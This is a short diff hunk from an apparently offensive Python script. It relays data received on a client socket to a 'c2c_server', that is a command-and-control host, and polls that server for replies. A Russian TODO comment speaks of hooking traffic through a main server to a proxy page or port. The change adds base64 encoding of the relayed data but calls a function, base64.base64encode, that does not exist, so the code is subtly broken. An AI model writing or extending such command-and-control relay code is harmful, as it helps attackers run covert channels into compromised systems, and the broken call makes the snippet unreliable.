@@ -54,7 +54,7 @@ while True:
     try:
         req = client.recv(4096)
         #TODO: открой основной сервак и сделай хуки через него на прокси страницу/порт, что зазочешь
-        s.post(c2c_server, data={"req": req})
+        s.post(c2c_server, data={"data": base64.base64encode(req)})
         # print(req.decode())
         req = requests.get(c2c_server + "ans")
         data = recv(req)
